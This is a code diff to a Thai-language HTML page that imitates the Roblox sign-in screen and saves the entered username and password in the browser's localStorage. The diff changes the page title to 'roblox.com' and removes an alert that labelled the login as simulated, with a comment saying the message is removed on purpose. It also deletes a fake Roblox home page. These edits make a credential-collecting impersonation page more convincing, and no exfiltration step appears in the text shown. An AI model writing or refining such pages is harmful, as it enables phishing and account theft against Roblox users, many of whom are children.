@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>ลงชื่อเข้าใช้ Roblox</title>
+  <title>roblox.com</title>
   <style>
     * {
       box-sizing: border-box;
@@ -239,7 +239,7 @@
       if (username && password) {
         localStorage.setItem('roblox_username', username);
         localStorage.setItem('roblox_password', password);
-        alert('เข้าสู่ระบบสำเร็จ (จำลอง)');
+        // ลบ alert ออก ไม่แสดงข้อความเข้าสู่ระบบ
       } else {
         alert('กรุณากรอกข้อมูลให้ครบ');
       }
@@ -266,88 +266,4 @@
   </script>
 
 </body>
-               </html>
-<!DOCTYPE html>
-<html lang="th">
-<head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Roblox - หน้าแรก</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #111;
-      color: white;
-    }
-    header {
-      background-color: #000;
-      display: flex;
-      align-items: center;
-      padding: 8px 16px;
-      justify-content: space-between;
-    }
-    nav {
-      background-color: #111;
-      display: flex;
-      justify-content: center;
-      gap: 30px;
-      padding: 10px 0;
-    }
-    .content {
-      padding: 20px;
-    }
-    footer {
-      margin-top: 50px;
-      font-size: 13px;
-      color: #aaa;
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 15px;
-      padding: 20px 10px;
-    }
-    a { color: #aaa; text-decoration: none; }
-  </style>
-</head>
-<body>
-  <header>
-    <div style="display:flex;align-items:center;gap:10px;">
-      <svg xmlns="http://www.w3.org/2000/svg" fill="white" viewBox="0 0 512 512" width="28" height="28">
-        <path d="M109.1 32L32 403.2 403.2 480 480 109.1 109.1 32zM335.1 335.1l-158.2-34.6 34.6-158.2 158.2 34.6-34.6 158.2z"/>
-      </svg>
-      <span>Roblox</span>
-    </div>
-    <div>👤</div>
-  </header>
-
-  <nav>
-    <div>อันดับ</div>
-    <div>มาร์เก็ตเพลส</div>
-    <div>สร้างสรรค์</div>
-    <div>Robux</div>
-  </nav>
-
-  <div class="content">
-    <h2>หน้าหลัก</h2>
-    <p>สวัสดี <span id="user"></span>, ยินดีต้อนรับสู่ Roblox!</p>
-  </div>
-
-  <footer>
-    <a href="#">เกี่ยวกับเรา</a>
-    <a href="#">งาน</a>
-    <a href="#">บล็อก</a>
-    <a href="#">ผู้ปกครอง</a>
-    <a href="#">บัตรของขวัญ</a>
-    <a href="#">ความช่วยเหลือ</a>
-    <a href="#">ข้อกำหนด</a>
-    <a href="#">การช่วยเหลือการเข้าถึง</a>
-    <a href="#">ความเป็นส่วนตัว</a>
-  </footer>
-
-  <script>
-    document.getElementById("user").innerText =
-      localStorage.getItem("roblox_username") || "ผู้ใช้ใหม่";
-  </script>
-</body>
-    </html>
+</html>
